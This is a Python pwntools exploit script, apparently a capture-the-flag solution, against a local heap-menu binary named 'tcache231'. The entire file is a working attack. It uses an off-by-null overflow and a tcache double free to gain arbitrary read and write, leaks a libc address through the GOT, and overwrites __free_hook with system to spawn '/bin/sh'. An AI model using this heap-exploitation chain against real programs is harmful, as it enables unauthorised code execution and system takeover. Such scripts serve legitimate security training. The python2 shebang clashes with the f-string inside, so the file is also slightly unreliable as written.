#!/usr/bin/env python2
# coding = utf-8

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def send_choice(choice):
    p.recvuntil('>')
    p.sendline(str(choice))

def create(size, data):
    send_choice(1)
    p.recvuntil('size ?')
    p.sendline(str(size))
    p.recvuntil('data:')
    p.send(data)

def delete(index):
    send_choice(2)
    p.recvuntil('index?')
    p.sendline(str(index))

def show(index):
    send_choice(3)
    p.recvuntil('index?')
    p.sendline(str(index))


p = process('./tcache231')
elf = ELF('./tcache231')
gdb.attach(p, '')

def arbitrary_write(desired_addr, data, shift):
    create(0x28, 'a')           # Chunk #0 to do OffByNull
    create(0x108, 'a')          # Chunk #1 whose size was written
    create(0x108, 'a')          # Chunk #2 (1) to seperate from top chunk and (2) to add tcachebin counts for chunk size 0x110
    delete(2 + shift)
    delete(1 + shift)
    delete(0 + shift)
    create(0x28, '/bin/sh\x00'.ljust(0x28, '\x00')) # Do OffByNull to change Chunk #1's size from 0x110 to 0x100
    delete(1 + shift)           # Double free Chunk #1, now Chunk #1 in both tcachebin 0x100 & 0x110
    create(0xf8, p64(desired_addr)) # Extend the tcachebin chain for size 0x110
    create(0x108, 'a')
    create(0x108, data)

def arbitrary_read(desired_addr, shift):
    note_num_addr = 0x4040AC
    arbitrary_write(note_num_addr, p32(0) + b'\x00' * 0x30 + p64(desired_addr) + p64(0) * 5, shift)
    show(0)

free_got = 0x404018
arbitrary_read(free_got, 0)
free_libc = u64(p.recv(6) + b'\x00\x00')
libc = LibcSearcher('free', free_libc)
libc_base = free_libc - libc.dump('free')
libc_system = libc_base + libc.dump('system')
free_hook_libc = libc_base + libc.dump('__free_hook')
log.info(f"free_libc: {hex(free_libc)}")
log.info('libc base: ' + hex(libc_base))
log.info('system: ' + hex(libc_system))
log.info('__free_hook: ' + hex(free_hook_libc))
arbitrary_write(free_hook_libc, p64(libc_system), 1)
delete(4)

p.interactive()
